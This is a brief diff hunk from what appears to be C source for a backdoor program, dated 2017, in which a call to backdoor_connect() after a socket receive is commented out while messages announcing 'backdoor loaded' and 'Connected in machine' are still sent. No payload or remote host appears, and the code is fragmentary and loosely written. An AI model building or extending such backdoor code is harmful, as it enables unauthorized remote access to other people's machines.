@@ -321,7 +321,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      /* fck, now  i have power!
       made conditions here. */
      if(recv(x,command,bytes,NULL) == true)
-     backdoor_connect();
+     //backdoor_connect();
      send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
      /*handle with the impossible errors. */
